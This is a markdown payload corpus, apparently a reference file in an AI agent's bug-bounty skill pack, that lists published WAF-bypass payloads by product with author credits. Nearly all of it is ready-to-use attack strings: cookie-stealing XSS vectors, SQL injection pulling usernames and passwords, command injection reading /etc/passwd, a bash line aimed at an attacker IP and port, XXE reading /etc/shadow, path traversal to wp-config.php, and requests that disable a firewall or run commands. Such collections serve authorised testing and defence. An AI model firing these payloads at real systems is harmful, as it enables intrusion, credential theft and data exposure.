# Known WAF Bypasses — version-tagged payload corpus

Concrete, **working payloads** that have bypassed specific WAF products, ported from the Awesome-WAF
"Known Bypasses" corpus. Linked from `SKILL.md` **Phase 4** (product-specific) — grab a payload here
*after* you've fingerprinted the product in Phase 2, not during the generic Phase 3 spray.

**Use discipline:**
- Every payload is tagged with its **author (@handle)**, the **WAF version / rule-set** it was tested
  against, and the **source** link. Vendors push rule updates constantly — **treat each as a starting
  point, verify it still passes before you build on it.** Stale ones self-identify via the version tag.
- A payload that bypasses the WAF is **not a finding on its own** — it must fire the underlying vuln
  server-side. See `SKILL.md` Core Philosophy: *no underlying vuln = no report*.
- XSS payloads here are reflected/DOM PoCs — confirm execution in the headless browser (CLAUDE.md
  Mode 2) before reporting, never assume from the HTTP response alone.

> Anchors match the `known-bypasses.md#<product>` links in SKILL.md Phase 4.

---

## Cloudflare

- **XSS** — [@SalahHasoneh1](https://twitter.com/SalahHasoneh1) ([src](https://twitter.com/SalahHasoneh1/status/1281254703360344064))
```
<svg onx=() onload=(confirm)(1)>
```
- **XSS** — [@c0d3g33k](https://twitter.com/c0d3g33k) ([src](https://pastebin.com/i8Ans4d4)) — HTML-entity-encoded `javascript:` scheme
```
<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
```
- **XSS (set)** — [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) ([src](https://twitter.com/h1_ragnar))
```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
1'"><img/src/onerror=.1|alert``>
```
- **XSS** — [@RakeshMane10](https://twitter.com/RakeshMane10) ([src](https://twitter.com/RakeshMane10/status/1109008686041759744)) — decimal HTML entities
```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```
- **XSS** — [@ArbazKiraak](https://twitter.com/ArbazKiraak) ([src](https://twitter.com/ArbazKiraak/status/1090654066986823680)) — HTML5 named entities as whitespace
```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert&lpar;this['document']['cookie']&rpar;">X</a>
```
- **XSS** — [@Ahmet Ümit](https://twitter.com/ahmetumitbayram) — comment-break abuse
```
<--`<img/src=` onerror=confirm``> --!>
```
- **XSS** — [@Shiva Krishna](https://twitter.com/le4rner) ([src](https://twitter.com/le4rner/status/1146453980400082945))
```
javascript:{alert`0`}
```
- **XSS** — [@Brute Logic](https://twitter.com/brutelogic) ([src](https://twitter.com/brutelogic/status/1147118371965755393)) — `<base>` hijack
```
<base href=//knoxss.me?
```
- **XSS (Chrome only)** — [@RenwaX23](https://twitter.com/RenwaX23) ([src](https://twitter.com/RenwaX23/status/1147130091031449601))
```
<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
```
- **RCE detection bypass** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://www.secjuice.com/web-application-firewall-waf-evasion/)) — `$u` empty-var comment splitting
```
cat$u+/etc$u/passwd$u
/bin$u/bash$u <ip> <port>
";cat+/etc/passwd+#
```

## AWS WAF

- **SQLi** — [@enkaskal](https://twitter.com/enkaskal) ([PoC](https://github.com/enkaskal/aws-waf-sqli-bypass-PoC)) — statement outside the quoted string
```
"; select * from TARGET_TABLE --
```
- **XSS** — [@kmkz](https://twitter.com/kmkz_security) ([src](https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet#L285))
```
<script>eval(atob(decodeURIComponent("payload")))//
```
- **XSS** — Daniele Linguaglossa ([src](https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf)) — popover event abuse
```
<strong><button popovertarget=x>click me</button><test onbeforetoggle=alert(document.domain) popover id=x>aaa</aaa></strong>
```

## CloudFront

- **Path-rule bypass — Spring Boot `/actuator`** — Liodeus (field finding) — a CloudFront/AWS-WAF rule keys on the literal `/actuator` path; URL-encoding every byte defeats the string match, while the origin (Spring Boot) decodes it back and serves the actuator
```
/actuator   →   /%61%63%74%75%61%74%6f%72
```
The same gap hits any literal-path rule: `%2e` self-ref, mixed case (`/AcTuAtOr`), double-encoding (`%2561…`). The bypass is only the door — confirm actuator endpoints are actually exposed (`/actuator/env`, `/heapdump`, `/mappings`) and leak before reporting.

## ModSecurity CRS

- **XSS (CRS 3.2)** — [@brutelogic](https://twitter.com/brutelogic) ([src](https://twitter.com/brutelogic/status/1209086328383660033)) — carriage-return in `javascript:` scheme
```
<a href="jav%0Dascript&colon;alert(1)">
```
- **RCE bypass — PL3 (v3.1)** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://www.secjuice.com/web-application-firewall-waf-evasion/))
```
;+$u+cat+/etc$u/passwd$u
```
- **RCE bypass — PL2 (v3.1)** — [@theMiddle](https://twitter.com/Menin_TheMiddle)
```
;+$u+cat+/etc$u/passwd+\#
```
- **RCE — PL1/PL2 (v3.0)** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)) — glob wildcards
```
/???/??t+/???/??ss??
```
- **RCE — PL3 (v3.0)** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)) — partial wildcards
```
/?in/cat+/et?/passw?
```
- **SQLi (v2.2)** — [@Johannes Dahse](https://twitter.com/#!/fluxreiners) ([src](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/)) — `div` operator + newline-comment
```
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
```
- **SQLi (v2.2)** — [@Yuri Goltsev](https://twitter.com/#!/ygoltsev)
```
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
```
- **SQLi (v2.2)** — [@Ahmad Maulana](http://twitter.com/#!/hmadrwx) — MySQL versioned comments
```
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
```
- **SQLi (v2.2)** — [@Travis Lee](http://twitter.com/#!/eelsivart)
```
amUserId=1 union select username,password,3,4 from users
```
- **SQLi (v2.2)** — [@Roberto Salgado](http://twitter.com/#!/lightos) — versioned comment `/*!31337…*/`
```
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
```
- **SQLi (v2.2)** — [@Georgi Geshev](http://twitter.com/#!/ggeshev) — vertical tab `%0b` as whitespace
```
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
```
- **SQLi (v2.2)** — SQLMap devs ([src](http://sqlmap.sourceforge.net/#developers)) — inline `#sqlmap…` comment padding
```
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
```
- **SQLi (v2.2)** — [@HackPlayers](http://twitter.com/#!/hackplayers)
```
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
```

## Imperva

- **XSS** — [@smaury92](https://twitter.com/smaury92) ([src](https://twitter.com/smaury92/status/1422599636800450572)) — split `alert` across id-attribute reads
```html
<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
```
- **XSS** — [@0xInfection](https://twitter.com/0xInfection) ([src](https://twitter.com/0xInfection/status/1420046446095519749)) — `globalThis` + unicode `prompt`
```html
<x/onclick=globalThis&lsqb;'pro'+'mpt']&lt;)>clickme
```
- **XSS** — [@0xInfection](https://twitter.com/0xInfection) ([src](https://twitter.com/0xInfection/status/1364622858090016777)) — JS destructuring to rebuild the call
```html
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```
- **XSS** — [@0xInfection](https://twitter.com/0xinfection) ([src](https://twitter.com/0xInfection/status/1212331839743873026))
```html
<a69/onclick=write&lpar;&rpar;>pew
```
- **XSS** — [@ugurercan](https://twitter.com/_ugurercan) ([src](https://twitter.com/_ugurercan/status/1188406765735632896)) — rebuild `window.onerror=alert`, throw document.domain
```html
<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
```
- **SecureSphere 13 — RCE** — [@rsp3ar](https://www.exploit-db.com/?author=9396) ([EDB-45542](https://www.exploit-db.com/exploits/45542))
- **XSS** — [@David Y](https://twitter.com/daveysec) — `\r\n` before `=` + jQuery `globalEval`
```
<svg onload\r\n=$.globalEval("al"+"ert()");>
```
- **XSS** — [@Emad Shanab](https://twitter.com/alra3ees)
```
<svg/onload=self[`aler`%2b`t`]`1`>
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```
- **XSS** — [@WAFNinja](https://waf.ninja) — multi-encoded
```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```
- **XSS** — [@i_bo0om](https://twitter.com/i_bo0om)
```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```
- **XSS** — [@c0d3g33k](https://twitter.com/c0d3g33k) — `data:` base64 object
```
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```
- **SQLi** — [@DRK1WI](https://www.exploit-db.com/?author=7740) — `0having` token the regex misses
```
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
```
- **SQLi** — [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
```
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
```
- **SecureSphere ≤ v13 — Privilege Escalation** — [@0x09AL](https://www.exploit-db.com/?author=8991) ([EDB-45130](https://www.exploit-db.com/exploits/45130))

## Akamai Kona

- **XSS** — [@SaadAhmed](https://twitter.com/XSaadAhmedX) ([src](https://twitter.com/XSaadAhmedX/status/1482398313227948034)) — `onfinish` + template-literal `alert`
```
%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
```
- **XSS** — [@h1_kenan](https://twitter.com/h1_kenan) ([src](https://twitter.com/h1_kenan/status/1185826172308983808)) — `onpointerenter` + comma-operator
```
asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
```
- **HTML injection (double-encoded)** — [@sp1d3rs](https://twitter.com/h1_sp1d3rs) ([H1-263226](https://hackerone.com/reports/263226))
```
%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
```
- **XSS** — [@Jonathan Bouman](https://twitter.com/jonathanbouman) ([src](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c)) — split `alert` across `alt`/`lang` attrs
```
<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"
```
- **XSS** — [@zseano](https://twitter.com/zseano) ([src](https://twitter.com/XssPayloads/status/1008573444840198144)) — `<base>` rewrite
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
- **XSS** — [@0xInfection](https://twitter.com/0xInfection)
```
<abc/onmouseenter=confirm%60%60>
```
- **XSS (double-encoded `onbeforescriptexecute`)** — [@sp1d3rs](https://twitter.com/h1_sp1d3rs) ([H1-263226](https://hackerone.com/reports/263226))
```
%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
```
- **XSS** — [@Frans Rosén](https://twitter.com/fransrosen) ([src](https://twitter.com/fransrosen/status/1126963506723590148)) — CSS animation event handler
```
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
```
- **XSS** — [@Ishaq Mohammed](https://twitter.com/security_prince) ([src](https://twitter.com/security_prince/status/1127804521315426304)) — `marquee onfinish` + `Function`
```
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
```

## F5

**ASM**
- **XSS** — [@WAFNinja](https://waf.ninja) — `background=javascript:` + `marquee onfinish`
```
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
```

**BIG-IP**
- **XSS** — [@WAFNinja](https://waf.ninja/) — `onwheel`/`contextmenu`, double-encoded `prompt`
```
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```
- **XSS** — [@Aatif Khan](https://twitter.com/thenapsterkhan)
```
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)">
```
- **`report_type` XSS** — [@NNPoster](https://www.exploit-db.com/?author=6654) ([src](https://www.securityfocus.com/bid/27462/info))
```
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
```
- **POST XXE** — [@Anonymous](https://www.exploit-db.com/?author=2168) — reads `/etc/shadow`
```
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
Host: bigip
Cookie: BIGIPAuthCookie=*VALID_COOKIE*
Content-Length: 143

<?xml  version="1.0" encoding='utf-8' ?>
<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
<message><dialogueType>&e;</dialogueType></message>
```
- **Directory traversal — read** — [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)
```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
```
- **Directory traversal — delete (POST)** — [@Anastasios Monachos](https://www.exploit-db.com/?author=2932) (full body in [Awesome-WAF source](https://github.com/0xInfection/Awesome-WAF/blob/master/README.md#f5-big-ip))

**FirePass**
- **SQLi (blind, time-based)** — [@Anonymous](https://www.exploit-db.com/?author=2168) — double-encoded, `BENCHMARK` + `LOAD_FILE`
```
state=%2527+and+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
```

## Sucuri

- **XSS (POST only)** — [@brutelogic](https://twitter.com/brutelogic) ([src](https://twitter.com/brutelogic/status/1209086328383660033))
```
<a href=javascript&colon;confirm(1)>
```
- **RCE smuggling** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)) — glob wildcards
```
/???/??t+/???/??ss??
```
- **RCE obfuscation** — [@theMiddle](https://twitter.com/Menin_TheMiddle) ([src](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)) — bash quote-concatenation
```
;+cat+/e'tc/pass'wd
c\\a\\t+/et\\c/pas\\swd
```
- **XSS** — [@Luka](https://twitter.com/return_0x) ([src](https://twitter.com/return_0x/status/1148605627180208129)) — `onauxclick` + `[1].map`
```
"><input/onauxclick="[1].map(prompt)">
```
- **XSS** — [@Brute Logic](https://twitter.com/brutelogic) ([src](https://twitter.com/brutelogic/status/1148610104738099201)) — `data:` form auto-submit
```
data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
<input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
<input type=submit></form>
```

## StackPath

- **XSS** — [@0xInfection](https://twitter.com/0xInfection) ([src](https://twitter.com/0xInfection/status/1298642820664823808))
```
<object/data=javascript:alert()>
<a/href="javascript%0A%0D:alert()>clickme
```
- **SQLi** — [@WAFNinja](https://waf.ninja) — no-whitespace `(select …)`
```
0 union(select 1,username,password from(users))
0 union(select 1,@@hostname,@@datadir)
```

## Fortinet FortiWeb

- **`pcre_expression` XSS** — [@Benjamin Mejri](https://www.exploit-db.com/?author=7854) — unvalidated `mkey`/`redir` reflection
```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0
```
- **CSP / size-limit bypass** — [@Binar10](https://www.exploit-db.com/exploits/18840) — pad body past the WAF inspection window (≥2399 bytes); the WAF inspects a prefix, the backend runs the full body
```
POST /<path>/login-app.aspx HTTP/1.1
Host: <host>
Content-Type: application/x-www-form-urlencoded
Content-Length: <≥2399 bytes>

var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
```
GET equivalent: `http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>`

## Airlock

*Ergon Airlock.*

- **SQLi — overlong UTF-8 (≥ v4.2.4)** — [@Sec Consult](https://www.exploit-db.com/?author=1614) — `%C0%80` is a non-shortest UTF-8 null; the WAF normalises it away, the backend doesn't
```
%C0%80'+union+select+col1,col2,col3+from+table+--+
```

---

## Other products (smaller sets)

### Barracuda
- **XSS** — [@WAFNinja](https://waf.ninja) — `onwheel`/`contextmenu`/double-encoded `mouseover`
```
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```
- **HTML injection** — [@Global-Evolution](https://www.exploit-db.com/?author=2016) — reflected iframe in `backup_*` params
```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
```
- **XSS** — [@0xInfection](https://twitter.com/0xInfection) — newline-split `javascript:` scheme
```
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
```
- **Barracuda WAF 8.0.1 RCE (MSF)** — [@xort](https://www.exploit-db.com/?author=479) ([EDB-40146](https://www.exploit-db.com/exploits/40146)) · **Spam & Virus Firewall 5.1.3 RCE** ([EDB-40147](https://www.exploit-db.com/exploits/40147))

### Citrix NetScaler
- **SQLi via HPP (NS10.5)** — [@BGA Security](https://www.exploit-db.com/?author=7396) — SOAP body param the WAF doesn't inspect
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
        <string>’ union select current_user, 2#</string>
    </soapenv:Body>
</soapenv:Envelope>
```
- **`generic_api_call.pl` XSS** — [@NNPoster](https://www.exploit-db.com/?author=6654) ([EDB-30777](https://www.exploit-db.com/exploits/30777))
```
http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
```

### Comodo
- **XSS** — [@0xInfection](https://twitter.com/0xinfection) — `new Function` template literal + `ondragstart`/`eval`
```
<input/oninput='new Function`confirm\`0\``'>
<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
```
- **SQLi** — [@WAFNinja](https://waf.ninja) — inline comment
```
0 union/**/select 1,version(),@@datadir
```

### DotDefender
- **Firewall disable (v5.0)** — [@hyp3rlinx](http://hyp3rlinx.altervista.org) — POST `<enabled>false</enabled>` to its own console
```
PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
<enabled>false</enabled>
```
- **RCE (v3.8-5)** — [@John Dos](https://www.exploit-db.com/?author=1996) — `deletesitename` shell-meta injection in the admin CGI
```
POST /dotDefender/index.cgi HTTP/1.1
Host: 172.16.159.132
Authorization: Basic YWRtaW46
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al ../;pwd;&action=deletesite&linenum=15
```
- **Persistent XSS (v4.0)** — [@EnableSecurity](https://enablesecurity.com) — payload smuggled in a *header* (`<script>: aa`) the WAF doesn't inspect
```
GET /c?a=<script> HTTP/1.1
Host: 172.16.159.132

<script>alert(1)</script>: aa
Keep-Alive: 300
```
- **R-XSS** — [@WAFNinja](https://waf.ninja)
```
<svg/onload=prompt(1);>
<isindex action="javas&tab;cript:alert(1)" type=image>
<marquee/onstart=confirm(2)>
```
- **XSS** — [@0xInfection](https://twitter.com/0xinfection)
```
<p draggable=True ondragstart=prompt()>alert
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
<a69/onclick=[1].findIndex(alert)>click
```
- **GET XSS (v4.02)** — [@DavidK](https://www.exploit-db.com/?author=2741)
```
/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E
```
- **POST XSS (v4.02)** — [@DavidK](https://www.exploit-db.com/?author=2741) — destructuring to rebuild the call
```
<img src="WTF" onError="{var {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/.source)" />
```

### WebARX (WordPress)
- **XSS** — [@0xInfection](https://twitter.com/0xinfection)
```
<a69/onauxclick=open&#40&#41>rightclickhere
```
- **Whitelist-string bypass (all protections)** — [@Osanda Malith](https://twitter.com/OsandaMalith) ([src](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/)) — append the shared `ithemes-sync-request` token and the WAF skips inspection
```
# XSS
http://host.com/?vulnparam=<script>alert()</script>&ithemes-sync-request
# LFI
http://host.com/?vulnparam=../../../../../etc/passwd&ithemes-sync-request
# SQLi
http://host.com/?vulnparam=1%20unionselect%20@@version,2--&ithemes-sync-request
```

### WebKnight (AQTRONIX)
- **XSS** — [@WAFNinja](https://waf.ninja/) — HTML5 named entities as separators
```
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<marquee/onstart=confirm(2)>
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<img src=x onwheel=prompt(1)>
```
- **SQLi** — [@WAFNinja](https://waf.ninja)
```
0 union(select 1,username,password from(users))
0 union(select 1,@@hostname,@@datadir)
```
- **SQLi** — [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) ([src](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L562)) — `%`-split keywords
```
10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
```

### Wordfence (WordPress)
- **XSS** — [@Brute Logic](https://twitter.com/brutelogic) — HTML-entity `javascript:`
```
<a href=javas&#99;ript:alert(1)>
<a href=&#01javascript:alert(1)>
```
- **XSS** — [@0xInfection](https://twitter.com/0xInfection) — newline-split scheme + comment splitting
```
<a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click
```
- **HTML injection (LFI via plugin)** — [@Voxel](https://www.exploit-db.com/?author=8505) ([src](https://www.securityfocus.com/bid/69815/info))
```
http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```

### Cerber (WordPress)
- **Username-enum bypass — HTTP verb tampering** — [@ed0x21son](https://www.exploit-db.com/?author=9901) — `POST` to `?author=N` (WAF rule is GET-only)
```
POST host.com HTTP/1.1
Host: favoritewaf.com

author=1
```
- **Protected admin-scripts bypass** — [@ed0x21son](https://www.exploit-db.com/?author=9901) — `///` path prefix
```
http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils
http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
```
- **REST-API disable bypass** — [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
http://host/index.php/wp-json/wp/v2/users/
```

### Others (one-liners)
- **Cloudbric XSS** — [@0xInfection](https://twitter.com/0xinfection) — `[1].findIndex(alert)`
```
<a69/onclick=[1].findIndex(alert)>pew
```
- **QuickDefense XSS** — [@WAFNinja](https://waf.ninja/) — `onsearch`/`ontoggle`
```
?<input type="search" onsearch="alert(1)">
<details ontoggle=alert(1)>
```
- **Profense CSRF/XSS (≥ v2.6.2)** — [@Michael Brooks](https://www.exploit-db.com/?author=628) ([EDB-7919](https://www.exploit-db.com/exploits/7919)) — admin-panel `ajax.html?action=shutdown` via `<img>`; XSS in `proxy.html`
- **URLScan dir-traversal (≤ v3.1, ASP.NET only)** — [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) — `.%./` malformed dot-dot
```
http://host.com/test.asp?file=.%./bla.txt
```
- **Apache generic — lowercase method** — [@i_bo0om](http://twitter.com/i_bo0om) — `get` vs `GET`
```
get /login HTTP/1.1
Host: favoritewaf.com
```
- **IIS generic — leading tabs** — [@i_bo0om](http://twitter.com/i_bo0om)
```
    GET /login.php HTTP/1.1
Host: favoritewaf.com
```
